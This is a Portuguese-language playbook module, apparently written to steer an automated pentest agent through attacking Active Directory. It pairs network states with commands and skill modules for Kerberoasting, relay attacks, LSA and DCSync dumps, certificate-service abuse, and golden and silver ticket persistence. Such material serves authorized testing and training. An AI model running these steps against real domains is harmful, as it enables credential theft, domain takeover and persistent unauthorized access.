# FASE: ACTIVE DIRECTORY (módulo sob demanda)

Carregado quando: 88/389/636, DC, credenciais de domínio, BloodHound.

## Gates — pós-AD
```
SEM CREDENCIAIS:
  LDAP null bind   → ldapsearch dump de usuários
  SMB signing off  → ntlmrelayx
  AS-REP roastable → impacket-GetNPUsers → hashcat -m 18200

BLOODHOUND:
  ACL→DA           → acl-abuse skill
  SPNs             → GetUserSPNs → hashcat -m 13100 (RC4) / 19700 (AES)
  deleg irrestrita → Rubeus monitor capturar TGT
  deleg constrained→ constrained-delegation-abuse (S4U2self/S4U2proxy)
  ADCS no grafo    → certipy find --vulnerable (ESC1/ESC8)
  GenericAll/WriteDACL → bloodyAD explorar

KERBEROAST:
  RC4 $krb5tgs$23 → hashcat -m 13100 rockyou + best64.rule
  AES $krb5tgs$18 → hashcat -m 19700 rockyou + d3ad0ne.rule
  crack → DA       → secretsdump DCSync completo
  crack → local    → Read phases/post.md (lateral)

COM CREDENCIAIS:
  netexec smb <range>/24 -u U -p P → mapear acesso
  netexec ... --lsa                → dump LSA
  impacket-secretsdump dom/U:P@dc  → se acesso suficiente

OBJETIVO DA:
  impacket-secretsdump -just-dc dom/Administrator@dc
  hashcat -m 1000 ntds.dit.hashes rockyou

TRUST:
  floresta com trust → forest-trust-attack (SID history cross-forest)

PÓS-DA (persistência, ROOT já resolvido):
  krbtgt obtido      → golden ticket (impacket-ticketer)
  conta de serviço   → silver ticket
```

## Skill → Estado de Entrada
| Estado de entrada | Skill |
|---|---|
| Na rede AD sem credenciais | `cybersecurity-skills:performing-active-directory-penetration-test` |
| Credenciais válidas, attack paths | `cybersecurity-skills:performing-active-directory-bloodhound-analysis` |
| BloodHound coletado, analisar no CE | `cybersecurity-skills:conducting-internal-reconnaissance-with-bloodhound-ce` |
| Usuário de domínio, tickets p/ crack | `cybersecurity-skills:performing-kerberoasting-attack` |
| TGT ou hash, autenticar via ticket | `cybersecurity-skills:conducting-pass-the-ticket-attack` |
| Privilégios de replicação ou DA | `cybersecurity-skills:conducting-domain-persistence-with-dcsync` |
| PKI no AD, templates vulneráveis | `cybersecurity-skills:exploiting-active-directory-certificate-services-esc1` |
| Domain < 2019, sAMAccountName spoof | `cybersecurity-skills:exploiting-nopac-cve-2021-42278-42287` |
| GenericAll/WriteDACL/WriteOwner | `cybersecurity-skills:analyzing-active-directory-acl-abuse` |
| Delegação constrained (msDS-AllowedToDelegateTo) | `cybersecurity-skills:exploiting-constrained-delegation-abuse` |
| Trust entre florestas, SID history | `cybersecurity-skills:performing-active-directory-forest-trust-attack` |

## F1/F3 — Dedup BloodHound
Coleta (`performing-...-bloodhound-analysis`) e análise CE
(`conducting-internal-reconnaissance-with-bloodhound-ce`) são fases SEQUENCIAIS,
não redundantes. Coletou e importou? Não recarregar coleta — ir p/ queries CE
ou direto p/ técnica-alvo (kerberoast, ACL abuse, ADCS, delegação).
